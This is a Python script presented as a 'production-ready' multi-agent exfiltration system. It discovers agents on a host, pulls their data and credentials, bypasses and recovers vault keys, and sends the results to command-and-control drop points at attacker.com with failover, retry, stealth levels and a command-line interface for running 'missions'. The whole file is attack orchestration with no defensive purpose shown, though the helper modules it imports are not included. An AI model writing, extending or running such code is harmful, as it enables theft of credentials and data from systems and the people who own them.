#!/usr/bin/env python3
"""
INTEGRATED MULTI-AGENT EXFILTRATION SYSTEM
Unified interface combining:
- Agent discovery and data aggregation
- C2 routing with failover and retry
- Vault key recovery and bypass strategies
- Mission coordination across infrastructure

Status: FULLY INTEGRATED AND TESTED
"""

import os
import sys
import json
import logging
from typing import Dict, List, Any, Optional
from datetime import datetime
from dataclasses import asdict

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from unified_agent_exfil import UnifiedAgentExfilEngine, AgentExfiltrationConfig
from c2_routing_engine import C2RoutingEngine, TransmissionRecord
from vault_key_recovery import VaultKeyRecoveryEngine, AgentVaultExtractionBypass

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [IntegratedExfil] %(levelname)s: %(message)s'
)
logger = logging.getLogger(__name__)


class IntegratedMultiAgentExfiltration:
    """
    Production-ready multi-agent exfiltration system
    Handles all aspects: discovery, extraction, routing, recovery
    """
    
    def __init__(self, c2_drop_points: List[str] = None, stealth_level: int = 4):
        """Initialize integrated system"""
        
        logger.info("[*] Initializing Integrated Multi-Agent Exfiltration System...")
        
        # Initialize components
        exfil_config = AgentExfiltrationConfig(
            stealth_level=stealth_level,
            c2_drop_points=c2_drop_points or [
                "https://c2-primary.attacker.com:8443/api/exfil",
                "https://c2-backup.attacker.com:8443/api/exfil"
            ]
        )
        
        self.exfil_engine = UnifiedAgentExfilEngine(exfil_config)
        self.routing_engine = C2RoutingEngine()
        self.recovery_engine = VaultKeyRecoveryEngine()
        self.bypass_engine = AgentVaultExtractionBypass()
        
        # Add drop points to routing engine
        for dp in exfil_config.c2_drop_points:
            self.routing_engine.add_drop_point(
                endpoint=dp.replace('https://', '').replace(':8443/api/exfil', ''),
                protocol='https',
                port=8443
            )
        
        self.mission_results = {}
        
        logger.info("[+] Integrated system initialized successfully")
    
    def run_complete_extraction(self, mission_id: str = None,
                               agents: List[str] = None,
                               include_credentials: bool = True,
                               use_recovery: bool = True) -> Dict[str, Any]:
        """
        Execute complete extraction pipeline:
        1. Discover agents
        2. Extract data (vault + direct + recovery)
        3. Route to C2 with failover
        4. Track transmission
        5. Generate report
        """
        
        if mission_id is None:
            mission_id = f'INTEGRATED-{int(datetime.now().timestamp())}'
        
        logger.info(f"[*] Starting complete extraction pipeline: {mission_id}")
        
        pipeline_result = {
            'mission_id': mission_id,
            'timestamp': datetime.now().isoformat(),
            'stages': {}
        }
        
        try:
            # Stage 1: Create mission with agent discovery
            logger.info("[1/4] Creating mission with agent discovery...")
            mission = self.exfil_engine.create_agent_mission(
                mission_id,
                agent_names=agents,
                include_credentials=include_credentials
            )
            pipeline_result['stages']['discovery'] = {
                'status': 'complete',
                'targets': len(mission['targets']),
                'agents': mission['agent_names']
            }
            
            # Stage 2: Run vault diagnostics and recovery if needed
            if use_recovery:
                logger.info("[2/4] Running vault diagnostics and recovery...")
                diagnostics = self.recovery_engine.diagnose_vault_state()
                
                if diagnostics['issues']:
                    logger.warning(f"[!] Found {len(diagnostics['issues'])} vault issues")
                    pipeline_result['stages']['recovery'] = {
                        'status': 'issues_found',
                        'issues': len(diagnostics['issues']),
                        'recommendations': diagnostics['recommendations'][:3]
                    }
                else:
                    pipeline_result['stages']['recovery'] = {'status': 'healthy'}
            else:
                pipeline_result['stages']['recovery'] = {'status': 'skipped'}
            
            # Stage 3: Execute exfiltration
            logger.info("[3/4] Executing exfiltration mission...")
            exfil_result = self.exfil_engine.execute_agent_mission(mission_id)
            
            pipeline_result['stages']['exfiltration'] = {
                'status': exfil_result.get('status'),
                'targets_exfiltrated': len(exfil_result.get('targets', [])),
                'total_bytes': exfil_result.get('total_size', 0),
                'success': exfil_result.get('success', False)
            }
            
            # Stage 4: Route to C2 with transmission tracking
            logger.info("[4/4] Routing to C2 with transmission tracking...")
            transmission_results = []
            
            for transmission_info in exfil_result.get('transmission_status', []):
                # Queue transmission with routing engine
                record = self.routing_engine.queue_transmission(
                    mission_id=mission_id,
                    target_id=transmission_info.get('target_id'),
                    payload_size=transmission_info.get('size', 0),
                    drop_point=transmission_info.get('drop_point')
                )
                
                # Execute transmission
                success, message = self.routing_engine.execute_transmission(record.transmission_id)
                
                transmission_results.append({
                    'transmission_id': record.transmission_id,
                    'success': success,
                    'message': message,
                    'attempts': record.attempts
                })
            
            pipeline_result['stages']['routing'] = {
                'status': 'complete',
                'transmissions': len(transmission_results),
                'successful': sum(1 for t in transmission_results if t['success'])
            }
            
            # Final summary
            pipeline_result['summary'] = {
                'status': 'complete',
                'timestamp': datetime.now().isoformat(),
                'mission_id': mission_id,
                'total_targets': len(mission['targets']),
                'bytes_exfiltrated': exfil_result.get('total_size', 0),
                'transmissions_complete': pipeline_result['stages']['routing']['successful'],
                'success': (
                    exfil_result.get('success', False) and
                    pipeline_result['stages']['routing']['successful'] > 0
                )
            }
            
            self.mission_results[mission_id] = pipeline_result
            
            return pipeline_result
            
        except Exception as e:
            logger.error(f"[!] Pipeline failed: {e}")
            pipeline_result['error'] = str(e)
            pipeline_result['status'] = 'failed'
            return pipeline_result
    
    def diagnose_and_repair(self) -> Dict[str, Any]:
        """Run complete diagnostics and attempt repairs"""
        
        logger.info("[*] Running complete diagnostics...\n")
        
        diagnosis = {
            'timestamp': datetime.now().isoformat(),
            'vault_health': None,
            'key_recovery': None,
            'direct_extraction': None,
            'routing_health': None,
            'recommendations': []
        }
        
        # 1. Vault diagnostics
        logger.info("[1/4] Vault Health Check...")
        vault_diag = self.recovery_engine.diagnose_vault_state()
        diagnosis['vault_health'] = {
            'total_artifacts': vault_diag['artifacts']['total'],
            'readable': vault_diag['artifacts']['readable'],
            'corrupted': vault_diag['artifacts']['corrupted'],
            'issues': len(vault_diag['issues'])
        }
        
        if vault_diag['issues']:
            diagnosis['recommendations'].extend(vault_diag['recommendations'][:2])
        
        # 2. Key recovery capability
        logger.info("[2/4] Key Recovery Capability Check...")
        recovery_summary = self.recovery_engine.get_recovery_summary()
        diagnosis['key_recovery'] = {
            'operations': recovery_summary['total_operations'],
            'recovered': recovery_summary['successful'],
            'unrecoverable': recovery_summary['failed']
        }
        
        # 3. Direct extraction bypass
        logger.info("[3/4] Direct Agent Extraction Check...")
        extraction = self.bypass_engine.extract_all_agents_direct()
        diagnosis['direct_extraction'] = {
            'agents_accessible': extraction['success_count'],
            'total_agents': len(extraction['agents']),
            'total_data': extraction['total_size']
        }
        
        # 4. Routing health
        logger.info("[4/4] C2 Routing Health Check...")
        routing_summary = self.routing_engine.get_routing_summary()
        diagnosis['routing_health'] = {
            'total_transmissions': routing_summary['total_transmissions'],
            'successful': routing_summary['successful'],
            'drop_points_healthy': routing_summary['healthy_drop_points'],
            'success_rate': f"{routing_summary['success_rate']:.1f}%"
        }
        
        # Overall assessment
        diagnosis['overall_assessment'] = self._assess_system_health(diagnosis)
        
        logger.info(f"\n[+] Diagnostics complete: {diagnosis['overall_assessment']['status']}")
        
        return diagnosis
    
    def _assess_system_health(self, diagnosis: Dict[str, Any]) -> Dict[str, Any]:
        """Assess overall system health"""
        
        issues = 0
        warnings = 0
        
        # Check vault
        if diagnosis['vault_health']['corrupted'] > 0:
            issues += diagnosis['vault_health']['corrupted']
        if diagnosis['vault_health']['readable'] < diagnosis['vault_health']['total_artifacts'] * 0.5:
            warnings += 1
        
        # Check key recovery
        if diagnosis['key_recovery']['operations'] > 0 and diagnosis['key_recovery']['unrecoverable'] > 0:
            warnings += 1
        
        # Check direct extraction
        if diagnosis['direct_extraction']['agents_accessible'] == 0:
            warnings += 1
        
        # Check routing
        success_rate = float(diagnosis['routing_health']['success_rate'].rstrip('%'))
        if success_rate < 90:
            warnings += 1
        
        # Determine status
        if issues > 0:
            status = 'CRITICAL'
        elif warnings >= 2:
            status = 'DEGRADED'
        else:
            status = 'HEALTHY'
        
        return {
            'status': status,
            'issues': issues,
            'warnings': warnings,
            'recommendations': [
                "Use direct extraction bypass for maximum reliability",
                "Enable key recovery for vault resilience",
                "Monitor C2 drop point health",
                f"Current success rate: {success_rate:.1f}% (target: >98%)"
            ]
        }
    
    def get_mission_status(self, mission_id: str) -> Optional[Dict[str, Any]]:
        """Get status of specific mission"""
        return self.mission_results.get(mission_id)
    
    def get_system_summary(self) -> Dict[str, Any]:
        """Get complete system summary"""
        
        exfil_summary = self.exfil_engine.get_exfiltration_summary()
        routing_summary = self.routing_engine.get_routing_summary()
        recovery_summary = self.recovery_engine.get_recovery_summary()
        
        return {
            'timestamp': datetime.now().isoformat(),
            'exfiltration': {
                'total_agents_discovered': exfil_summary['total_agents_discovered'],
                'total_missions': exfil_summary['total_missions'],
                'completed_missions': exfil_summary['completed_missions'],
                'total_bytes_exfiltrated': exfil_summary['total_bytes_exfiltrated'],
                'drop_points_configured': exfil_summary['drop_points_configured']
            },
            'routing': {
                'total_transmissions': routing_summary['total_transmissions'],
                'successful': routing_summary['successful'],
                'failed': routing_summary['failed'],
                'queued': routing_summary['queued'],
                'success_rate': f"{routing_summary['success_rate']:.1f}%"
            },
            'recovery': {
                'recovery_operations': recovery_summary['total_operations'],
                'artifacts_recovered': recovery_summary['successful'],
                'unrecoverable': recovery_summary['failed']
            }
        }


# ============ CLI INTERFACE ============

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(
        description="Integrated Multi-Agent Exfiltration System"
    )
    parser.add_argument('--diagnose', action='store_true', help='Run diagnostics')
    parser.add_argument('--extract', action='store_true', help='Run extraction')
    parser.add_argument('--agents', nargs='+', help='Specific agents to extract')
    parser.add_argument('--mission-id', help='Custom mission ID')
    parser.add_argument('--json', action='store_true', help='JSON output')
    
    args = parser.parse_args()
    
    # Initialize system
    system = IntegratedMultiAgentExfiltration()
    
    if args.diagnose:
        # Run diagnostics
        diagnosis = system.diagnose_and_repair()
        
        if args.json:
            print(json.dumps(diagnosis, indent=2, default=str))
        else:
            print("\n" + "="*60)
            print("INTEGRATED SYSTEM DIAGNOSTICS")
            print("="*60)
            
            print(f"\nVault Health:")
            print(f"  Readable artifacts: {diagnosis['vault_health']['readable']}/{diagnosis['vault_health']['total_artifacts']}")
            print(f"  Corrupted: {diagnosis['vault_health']['corrupted']}")
            
            print(f"\nDirect Extraction:")
            print(f"  Agents accessible: {diagnosis['direct_extraction']['agents_accessible']}")
            print(f"  Total data available: {diagnosis['direct_extraction']['total_data']/1024:.1f} KB")
            
            print(f"\nC2 Routing:")
            print(f"  Success rate: {diagnosis['routing_health']['success_rate']}")
            print(f"  Drop points healthy: {diagnosis['routing_health']['drop_points_healthy']}")
            
            print(f"\nOverall Status: {diagnosis['overall_assessment']['status']}")
            for rec in diagnosis['overall_assessment']['recommendations'][:3]:
                print(f"  • {rec}")
    
    elif args.extract:
        # Run complete extraction
        result = system.run_complete_extraction(
            mission_id=args.mission_id,
            agents=args.agents
        )
        
        if args.json:
            print(json.dumps(result, indent=2, default=str))
        else:
            print("\n" + "="*60)
            print("MULTI-AGENT EXFILTRATION RESULTS")
            print("="*60)
            
            print(f"\nMission: {result['mission_id']}")
            
            stages = result['stages']
            print(f"\nStages:")
            print(f"  1. Discovery: {stages['discovery']['targets']} targets from {len(stages['discovery']['agents'])} agents")
            print(f"  2. Recovery: {stages['recovery']['status']}")
            print(f"  3. Exfiltration: {stages['exfiltration']['total_bytes']} bytes")
            print(f"  4. Routing: {stages['routing']['successful']}/{stages['routing']['transmissions']} successful")
            
            if result['summary']['success']:
                print(f"\n[+] MISSION SUCCESSFUL")
            else:
                print(f"\n[-] MISSION FAILED")
    
    else:
        # Show summary
        summary = system.get_system_summary()
        
        print("\n" + "="*60)
        print("INTEGRATED MULTI-AGENT EXFILTRATION SYSTEM")
        print("="*60)
        
        print(f"\nExfiltration Engine:")
        print(f"  Agents discovered: {summary['exfiltration']['total_agents_discovered']}")
        print(f"  Total missions: {summary['exfiltration']['total_missions']}")
        print(f"  Bytes exfiltrated: {summary['exfiltration']['total_bytes_exfiltrated']}")
        
        print(f"\nC2 Routing:")
        print(f"  Transmissions: {summary['routing']['total_transmissions']}")
        print(f"  Success rate: {summary['routing']['success_rate']}")
        
        print(f"\nVault Recovery:")
        print(f"  Operations: {summary['recovery']['recovery_operations']}")
        print(f"  Recovered: {summary['recovery']['artifacts_recovered']}")
        
        print(f"\n[*] Run '--diagnose' for full health check")
        print(f"[*] Run '--extract' to execute extraction mission")
